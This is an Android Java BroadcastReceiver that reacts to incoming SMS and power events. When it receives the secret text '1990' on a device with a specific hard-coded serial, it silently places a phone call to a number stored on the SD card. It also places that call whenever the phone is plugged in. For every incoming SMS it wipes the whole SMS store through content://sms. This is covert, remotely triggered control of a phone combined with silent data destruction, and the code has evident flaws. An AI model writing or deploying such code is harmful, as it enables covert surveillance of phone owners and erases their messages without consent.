package com.example.tal.alert;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;


public class MyBroadcastReceiver extends BroadcastReceiver {

    // Get the object of SmsManager
    final SmsManager sms = SmsManager.getDefault();


    String device_id="";
    String phonenum="";

    SQLiteDatabase db;




    @Override
    public void onReceive(Context context, Intent intent) {



        int status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL;

        int chargePlug = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;





        // This is open SQLite database and table creation
        try {
            db = SQLiteDatabase.openDatabase("sdcard/phonenumber.db", null, SQLiteDatabase.CREATE_IF_NECESSARY);
            db.execSQL("create table phonenum(" + "id INTEGER PRIMARY KEY AUTOINCREMENT, " + " Tel TEXT)");
        } catch (Exception e) {
        }


        // Selecting and attaching phone from database to phone call intent
        Cursor datax = db.rawQuery("select * from phonenum", null);
        if (datax.getCount() == 0) {
        } else {

            while (datax.moveToNext()) {
                phonenum+=datax.getString(1);
            }
        }


// This retrieve phone serial number
        device_id+= Build.SERIAL;


        // Retrieves a map of extended data from the intent.
        final Bundle bundle = intent.getExtras();

        try {

            if (bundle != null) {

                final Object[] pdusObj = (Object[]) bundle.get("pdus"); //A PDU is a “protocol data unit”, which is the industry format for an SMS message. because SMSMessage reads/writes

                for (int i = 0; i < pdusObj.length; i++) {

                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                    String phoneNumber = currentMessage.getDisplayOriginatingAddress();

                    String senderNum = phoneNumber;
                    String message = currentMessage.getDisplayMessageBody();


                    // This checks for authenticity for sms command and phone serial number to activate phone call
                    if(message.trim().equals("1990")){


                        if(device_id.trim().equals("KR8LEE9SSGU46HT8")) {


                            // Phone number intent that perform phone call
                                    Intent intentcall = new Intent();
                                    intentcall.setAction(Intent.ACTION_CALL);
                                    intentcall.setData(Uri.parse("tel:"+phonenum));
                                    intentcall.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                    context.startActivity(intentcall);


                        //ContentResolver is used to read sms inbox
                        ContentResolver cr=context.getContentResolver();
                        Uri url=Uri.parse("content://sms");
                        int num_deleted = cr.delete(url, null,null);
                        return;

                        }

                    }  else {

                        //ContentResolver is used to read sms inbox
                        ContentResolver cr=context.getContentResolver();
                        Uri url=Uri.parse("content://sms");
                        int num_deleted = cr.delete(url, null,null);
                        return;
                    }


                }
            }

        }

        //checking sms to confirm authenticity of the secret trigger code if its correct
        catch (Exception e) {
            Log.e("SmsReceiver", "Exception smsReceiver" + e);

        }











        //MyPowerReceiver: Power is connected intent
        if(intent.getAction() == Intent.ACTION_POWER_CONNECTED){

            if(device_id.trim().equals("KR8LEE9SSGU46HT8")) {



                        Intent intentcall = new Intent();
                        intentcall.setAction(Intent.ACTION_CALL);
                        intentcall.setData(Uri.parse("tel:"+phonenum));
                        intentcall.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(intentcall);

            }


            //MyPowerReceiver: Power is disconnected intent
        }  else  if(intent.getAction() == Intent.ACTION_POWER_DISCONNECTED) {

        }



    }






}
